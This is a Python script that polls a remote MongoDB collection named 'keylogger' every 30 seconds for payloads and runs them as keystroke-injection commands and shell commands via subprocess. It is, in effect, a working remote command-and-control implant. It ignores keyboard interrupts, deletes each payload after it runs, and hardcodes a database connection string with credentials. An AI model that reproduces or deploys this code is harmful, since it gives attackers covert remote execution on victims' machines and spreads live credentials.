import os
import subprocess
import webbrowser
import time
import pyautogui
import pymongo

client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
db = client["keylogger"]
payload_collection = db["payload"]

def execute_command(command):
    try:
        if command.startswith("DELAY"):
            delay_time = int(command.split()[1]) / 1000.0
            time.sleep(delay_time)
        elif command.startswith("STRING"):
            string_to_type = command.split("STRING ")[1].strip()
            pyautogui.typewrite(string_to_type)
        elif command.startswith("ENTER"):
            pyautogui.press('enter')
        elif command.startswith("GUI"):
            gui_key = command.split()[1].lower()
            if gui_key == "r":
                pyautogui.hotkey('win', 'r')
            elif gui_key == "l":
                pyautogui.hotkey('win', 'l')
            else:
                print("Unsupported GUI key:", gui_key)
        elif command.startswith("MENU"):
            pyautogui.press('menu')
        elif command.startswith("CTRL"):
            ctrl_key = command.split()[1].lower()
            pyautogui.hotkey('ctrl', ctrl_key)
        elif command.startswith("ALT"):
            alt_key = command.split()[1].lower()
            pyautogui.hotkey('alt', alt_key)
        elif command.startswith("SHIFT"):
            shift_key = command.split()[1].lower()
            pyautogui.hotkey('shift', shift_key)
        elif command.startswith("REM") or command.startswith("//"):
            # Ignore comments
            pass
        elif command.startswith("EXECUTE:"):
            file_path = command.split(":")[1].strip()
            subprocess.Popen(file_path, shell=True)
        elif command.startswith("BROWSE:"):
            url = command.split(":")[1].strip()
            webbrowser.open(url)
        elif command.startswith("CUSTOM:"):
            custom_command = command.split(":")[1].strip()
            # Add more custom command handling here as needed
        else:
            # Invalid command
            print("Invalid command:", command)
    except Exception as e:
        print("Error executing command:", e)

def store_and_execute_payload():
    while True:
        try:
            # Retrieve the document from MongoDB
            document = payload_collection.find_one()

            if document:
                # Check if the document contains the expected key
                if "text" in document:
                    # Get the text content from the document
                    text_content = document["text"]

                    # Delete existing "payload.txt" file if present
                    if os.path.exists("payload.txt"):
                        os.remove("payload.txt")

                    # Save the text content to "payload.txt" file
                    with open("payload.txt", "w") as file:
                        file.write(text_content)

                    print("Text content retrieved from MongoDB and stored in payload.txt.")
                    # Execute the payload immediately
                    execute_payload()

                    # Delete the document from the collection
                    payload_collection.delete_one({"_id": document["_id"]})
                else:
                    print("Document does not contain the '\"text\"' key.")
            else:
                print("No document found in MongoDB.")
            
            # Wait for 30 seconds before checking for new payloads again
            time.sleep(30)
        
        except KeyboardInterrupt:
            print("Keyboard interrupt detected. Continuing execution...")

def execute_payload():
    try:
        current_directory = os.path.dirname(os.path.realpath(__file__))
        file_path = os.path.join(current_directory, 'payload.txt')
        if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
            print("Executing payload...")
            with open(file_path, 'r') as file:
                for line in file:
                    execute_command(line.strip())
            # Delete the payload.txt file after executing the payload
            os.remove(file_path)
        else:
            print("Payload file is empty or does not exist.")
    except KeyboardInterrupt:
        print("Keyboard interrupt detected. Continuing execution...")

if __name__ == "__main__":
    store_and_execute_payload()
